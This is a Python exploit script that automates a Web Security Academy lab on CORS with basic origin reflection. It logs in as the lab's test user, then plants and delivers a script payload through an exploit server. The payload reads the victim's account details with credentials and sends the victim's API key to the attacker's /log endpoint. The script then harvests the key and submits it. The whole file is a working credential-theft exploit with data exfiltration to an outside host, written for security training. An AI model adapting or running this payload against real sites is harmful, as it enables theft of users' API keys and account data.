#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import re
import subprocess
import sys
from bs4 import BeautifulSoup
from selenium import webdriver
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Cross-origin resource sharing (CORS) Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" 

""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
s = requests.Session()

def get_session(s, url):
    path = '/'
    r = s.get(url + path, verify=False)
    cookies = str(r.cookies)
    spl1 = cookies.split("session=")[1]
    global session
    session = spl1.split(" ")[0]
    return session

def get_csrf(s, url, session):
    path = '/login'
    headers = {
        "Cookie": "session=" + session
    }
    r = s.get(url + path, verify=False, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    global csrf
    csrf = soup.find("input")['value']
    return csrf

def login(s, url, session, csrf):
    login_path = '/login'
    data = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter"
    }
    headers = {
        "Cookie": "session=" + session
    }
    s.post(url + login_path, verify=False, data=data, headers=headers)

def exp_hostname(s, url):
    r = requests.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    for a in soup.find_all('a', href=True):
        if ('exploit' in a['href']):
            global hostname
            hostname = a['href']
            return hostname

def send_payload(hostname):
    global command
    command = "<script>fetch('" + url + "/AccountDetails', {credentials: 'include'}) .then((response) => response.json()) .then((data) => fetch('" + hostname + "/log?' + data['apikey']));</script>"
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": command,
        "formAction": "STORE"
    }
    s.post(hostname, verify=False, data=data)
    data1 = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": command,
        "formAction": "DELIVER_TO_VICTIM"
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        s.post(hostname, verify=False, data=data1, proxies=proxies)
    else:
        s.post(hostname, verify=False, data=data1)

def get_admin_api(url, session, hostname):
    log_path = '/log'
    req = s.get(hostname + log_path, verify=False)
    for line in req.content.splitlines():
            sl = line.decode("utf-8")
            res = re.search(r'\b[0-9a-zA-Z]{32}\b', sl)
            if res:
                admin_api_key = res.group()
                data = {
                    "answer": admin_api_key
                }
                headers = {
                    "Cookie": "session=" + session
                }
                s.post(url + '/submitSolution', verify=False, data=data, headers=headers)
                r = s.get(url, verify=False, headers=headers)
                if (b'Congratulations, you solved the lab!' in r.content):
                    print("(+) Successful CORS exploitation!")
                    subprocess.call(["firefox", url])
                    sys.exit(0)
            else: 
                pass

def main():
    
    print("(+) Exploiting CORS vulnerability with basic origin reflection")
        
    get_session(s, url)

    get_csrf(s, url, session)

    login(s, url, session, csrf)

    exp_hostname(s, url)
    
    send_payload(hostname)

    get_admin_api(url, session, hostname)

if __name__ == "__main__":
    main()
